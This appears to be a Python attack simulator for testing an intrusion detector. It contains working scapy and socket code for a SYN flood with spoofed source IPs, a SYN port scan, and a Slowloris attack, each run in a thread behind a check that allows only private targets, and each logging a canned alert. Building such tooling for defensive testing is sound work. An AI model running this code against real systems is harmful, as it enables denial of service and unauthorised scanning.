import random
import threading
import logging
import ipaddress
import time
from scapy.all import IP, TCP, send
from alert_manager import AlertManager

alert_manager = AlertManager("logs/alerts.db")
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("attack_simulator")


# -------------------------
# Safety Check
# -------------------------

def _validate_target(ip):
    """
    Prevent accidental attacks on public infrastructure.
    Only allow private/local IPs.
    """
    try:
        ip_obj = ipaddress.ip_address(ip)
        if not ip_obj.is_private:
            raise ValueError(
                f"Target {ip} is not a private IP. Simulator blocked for safety."
            )
    except ValueError as e:
        logger.error(str(e))
        raise


def _random_ip():
    """Generate random spoofed source IP"""
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


import random

def generate_alert(target_ip, port, attack_type):

    alert = {
        "timestamp": "2026-01-01T00:00:00",
        "src_ip": f"192.168.1.{random.randint(2,200)}",
        "dst_ip": target_ip,
        "src_port": random.randint(1000,65000),
        "dst_port": port,
        "protocol": 6,
        "rf_label": attack_type if attack_type else " Unknown",
        "rf_confidence": 0.92,
        "ae_anomaly_score": 0.88,
        "final_verdict": "Attack",
        "combined_confidence": 0.90
    }

    alert_manager.add_alert(alert)



# -------------------------
# SYN Flood
# -------------------------

def syn_flood(target_ip, port=80, count=1000):
    """
    Simulates a SYN flood attack.
    Sends many TCP SYN packets with random source IPs.
    """

    def attack():
        logger.warning(f"Starting SYN flood against {target_ip}:{port}")

        for i in range(count):
            packet = IP(src=_random_ip(), dst=target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags="S"
            )

            send(packet, verbose=False)
            generate_alert(target_ip, port, "SYN Flood")

        logger.warning("SYN flood simulation completed")

    _validate_target(target_ip)

    thread = threading.Thread(target=attack, daemon=True)
    thread.start()

    return {
        "attack": "syn_flood",
        "target": target_ip,
        "port": port,
        "packets": count,
        "status": "started"
    }


# -------------------------
# Port Scan (SYN Scan)
# -------------------------

def port_scan(target_ip, ports=(1, 1024)):
    """
    SYN scan across a range of ports.
    """

    start_port, end_port = ports

    def scan():
        logger.warning(f"Starting SYN port scan on {target_ip}")

        for port in range(start_port, end_port + 1):
            packet = IP(dst=target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags="S"
            )

            send(packet, verbose=False)
            generate_alert(target_ip, port, "Port Scan")

        logger.warning("Port scan simulation completed")

    _validate_target(target_ip)

    thread = threading.Thread(target=scan, daemon=True)
    thread.start()

    return {
        "attack": "port_scan",
        "target": target_ip,
        "port_range": ports,
        "status": "started"
    }


# -------------------------
# Slowloris Simulation
# -------------------------

def slowloris(target_ip, port=80, connections=50):
    """
    Simulates Slowloris-style behavior by opening connections
    and slowly sending partial headers.
    """

    import socket

    def attack():
        logger.warning(f"Starting Slowloris simulation against {target_ip}:{port}")

        sockets = []

        for _ in range(connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, port))

                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: %b\r\n" % target_ip.encode())

                sockets.append(s)
            except Exception as e:
                logger.error(f"Connection failed: {e}")

        while True:
            for s in list(sockets):
                try:
                    s.send(b"X-a: keep-alive\r\n")
                except:
                    sockets.remove(s)

            time.sleep(.5)

    _validate_target(target_ip)

    thread = threading.Thread(target=attack, daemon=True)
    thread.start()

    return {
        "attack": "slowloris",
        "target": target_ip,
        "port": port,
        "connections": connections,
        "status": "started"
    }